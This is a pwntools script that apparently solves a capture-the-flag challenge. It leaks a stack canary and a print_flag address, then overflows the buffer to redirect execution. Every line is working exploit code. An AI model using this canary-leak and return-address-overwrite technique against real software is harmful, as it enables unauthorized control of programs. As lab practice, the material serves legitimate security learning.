from pwn import *

elf = context.binary = ELF('./task')

# it is because gets ends reading if we send newline character
while True:
	if args.GDB:
		p = gdb.debug(elf.path, '\n'.join([
			"b *vuln+149",
			"c"
		]))
	elif args.REMOTE:
		p = remote("localhost" if not args.ADDR else args.ADDR, 11326)
	else:
		p = process(elf.path)


	p.sendline(b"adminAAA" + b'A'*8)
	leak = p.recv(timeout=1.0).strip()
	print(f'Leak {leak}')
	leak = leak[leak.index(b'adminAAA')+8:]
	try:
		cookie = u64(leak[:8])
		cookie &= 0xFFFFFFFFFFFFFF00
	except:
		continue
	print(f"Cookie: {hex(cookie)}")
	print_flag = int(leak.split(b':')[-1], 16)
	print(f"print_flag: {hex(print_flag)}")

	payload = b'A' * 8
	payload += p64(cookie)
	payload += b'FAKE_RBP'
	payload += p64(print_flag)

	if b'\x0a' in payload:
		print("Repeat")
		continue
	
	p.sendline(payload)

	print(p.clean(1.0))
	break
